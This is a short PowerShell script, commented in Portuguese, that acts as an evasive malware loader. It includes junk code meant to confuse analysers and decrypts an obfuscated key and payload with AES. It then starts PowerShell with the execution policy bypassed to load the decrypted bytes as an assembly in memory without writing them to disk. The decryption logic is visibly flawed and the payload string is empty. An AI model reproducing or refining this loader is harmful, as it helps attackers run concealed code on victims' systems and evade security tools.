
    function JunkCode {
        # Função de junk code para confundir analisadores
        $dummy = 1 + 2
        $dummy = $dummy * 3
        return $dummy
    }

    function Decrypt-Data {
        param (
            [string]$input,
            [string]$key
        )
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
        $aes.IV = $aes.IV
        $decryptor = $aes.CreateDecryptor()
        $memoryStream = New-Object System.IO.MemoryStream([System.Convert]::FromBase64String($input))
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $decryptedBytes = New-Object byte[]($memoryStream.Length)
        $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length) | Out-Null
        $memoryStream.Close()
        $cryptoStream.Close()
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    }

    # Chaves e dados obfuscados
    $obfuscatedKey = 'dHFqbUpVWDlZa1VRZXZqcEdCa0hkTU8yVnd5MWFKbUxsMFgtUzVKZHQyST0='
    $obfuscatedBytes = ''

    # Descriptografa a chave e os bytes
    $key = Decrypt-Data -input $obfuscatedKey -key $obfuscatedKey
    $exeBytes = Decrypt-Data -input $obfuscatedBytes -key $key

    # Executa a função junk code
    JunkCode

    # Executa diretamente os bytes na memória sem salvar no disco
    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo.FileName = 'powershell'
    $proc.StartInfo.Arguments = '-ExecutionPolicy Bypass -Command "[System.Reflection.Assembly]::Load((New-Object System.Text.UTF8Encoding).GetBytes($exeBytes))"'
    $proc.Start()
    
